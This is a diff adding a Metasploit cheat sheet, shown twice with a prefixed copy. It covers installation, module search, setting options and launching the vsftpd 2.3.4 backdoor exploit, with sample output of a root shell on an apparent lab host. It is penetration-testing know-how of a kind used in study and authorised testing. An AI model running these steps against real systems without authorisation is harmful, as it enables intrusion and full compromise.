@@ -1,0 +1,167 @@
+Update Metasploit:
+$ sudo apt update
+$ sudo apt install metasploit-framework
+If nedded:
+$ cd /usr/share/metasploit-framework
+$ sudo gem install bundler
+
+Time to use it.
+-> Start Metasploit
+$ msfconsole
+
+-> Search for something.
+msf6> search <keyword>
+
+-> Info for something.
+msf6> search <complete name>
+Example: 
+  msf6> search exploit/unix/ftp/vsftpd_234_backdoor
+  The result give information:
+  Rank: easy to exploit. Here Excellent means, very easy to exploit.
+
+-> Use a module.
+msf6> use <exploit>
+Example:
+  msf6> use exploit/unix/ftp/vsftpd_234_backdoor
+
+-> Look at module options.
+msf6> exploit(<name without 'exploit'>)> show options
+Example:
+  Name      Required    Description
+  ----      --------    ----------
+  RHOSTS      Yes       The target host(s) ...
+
+-> Look for module information.
+msf6> exploit(<name without 'exploit'>)> info
+
+-> Launch the exploit.
+msf6> exploit(<name without 'exploit'>)> exploit
+Example of output (between '---'. Here, you are connected to the machine as root):
+---
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+[*] 192.168.8.225:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.8.225:21 - USER: 331 Please specify the password.
+[+] 192.168.8.225:21 - Backdoor service has been spawned, handling...
+[+] 192.168.8.225:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.8.128:39155 -> 192.168.8.225:6200) at 2025-01-15 06:21:12 -0500
+
+pwd
+/
+---
+
+-> Quit the exploit (here, the shell).
+Ctrl-C and 'y'.
+
+-> Quit the exploit (return to home).
+$ msf6> back
+
+-> Use auxiliary scanning modules.
+Metasploit can use modules to scan.
+Example:
+  msf6> use auxiliary/scanner/ftp/ftp_version
+  msf6> show options
+  msf6> set <option> <value>
+  msf6> exploit
+
+-> Use payloads.
+Metasploit can use payload once the exploit is launched.
+Example:
+  msf6> show payloads
+  msf6> use payload/...
+
+-> Quit the software.
+$ msf6> quit
+
+>@############################################################################################################################
+>@#                                                                                                                          #
+>@# [ Metasploit ]                                                                                                           #
+>@# Metasploit is a complete environment used to test intrusion. This environment is maintained by Rapid7.                   #
+>@#                                                                                                                          #
+>@# See official site: https://metasploit.com / https://metasploit.help.rapid7.com/                                          #
+>@# See documentation: https://docs.metasploit.com/                                                                          #
+>@#                                                                                                                          #
+>@.--------------------------------------------------------------------------------------------------------------------------.
+>@
+>@Update Metasploit:
+>@$ sudo apt update
+>@$ sudo apt install metasploit-framework
+>@If nedded:
+>@$ cd /usr/share/metasploit-framework
+>@$ sudo gem install bundler
+>@
+>@Time to use it.
+>@-> Start Metasploit
+>@$ msfconsole
+>@
+>@-> Search for something.
+>@msf6> search <keyword>
+>@
+>@-> Info for something.
+>@msf6> search <complete name>
+>@Example: 
+>@  msf6> search exploit/unix/ftp/vsftpd_234_backdoor
+>@  The result give information:
+>@  Rank: easy to exploit. Here Excellent means, very easy to exploit.
+>@
+>@-> Use a module.
+>@msf6> use <exploit>
+>@Example:
+>@  msf6> use exploit/unix/ftp/vsftpd_234_backdoor
+>@
+>@-> Look at module options.
+>@msf6> exploit(<name without 'exploit'>)> show options
+>@Example:
+>@  Name      Required    Description
+>@  ----      --------    ----------
+>@  RHOSTS      Yes       The target host(s) ...
+>@
+>@-> Look for module information.
+>@msf6> exploit(<name without 'exploit'>)> info
+>@
+>@-> Set an option.
+>@msf6> exploit(<name without 'exploit'>)> set RHSOTS <ip of the target>
+>@
+>@-> Launch the exploit.
+>@msf6> exploit(<name without 'exploit'>)> exploit
+>@Example of output (between '---'. Here, you are connected to the machine as root):
+>@---
+>@msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+>@[*] 192.168.8.225:21 - Banner: 220 (vsFTPd 2.3.4)
+>@[*] 192.168.8.225:21 - USER: 331 Please specify the password.
+>@[+] 192.168.8.225:21 - Backdoor service has been spawned, handling...
+>@[+] 192.168.8.225:21 - UID: uid=0(root) gid=0(root)
+>@[*] Found shell.
+>@[*] Command shell session 1 opened (192.168.8.128:39155 -> 192.168.8.225:6200) at 2025-01-15 06:21:12 -0500
+>@
+>@pwd
+>@/
+>@---
+>@
+>@-> Quit the exploit (here, the shell).
+>@Ctrl-C and 'y'.
+>@
+>@-> Quit the exploit (return to home).
+>@$ msf6> back
+>@
+>@-> Use auxiliary scanning modules.
+>@Metasploit can use modules to scan.
+>@Example:
+>@  msf6> use auxiliary/scanner/ftp/ftp_version
+>@  msf6> use auxiliary/scanner/ftp/ftp_version
+>@  msf6> show options
+>@  msf6> set <option> <value>
+>@  msf6> exploit
+>@
+>@-> Use payloads.
+>@Metasploit can use payload once the exploit is launched.
+>@Example:
+>@  msf6> show payloads
+>@  msf6> use payload/...
+>@
+>@-> Quit the software.
+>@$ msf6> quit
+>@
+>@############################################################################################################################
+>@
+
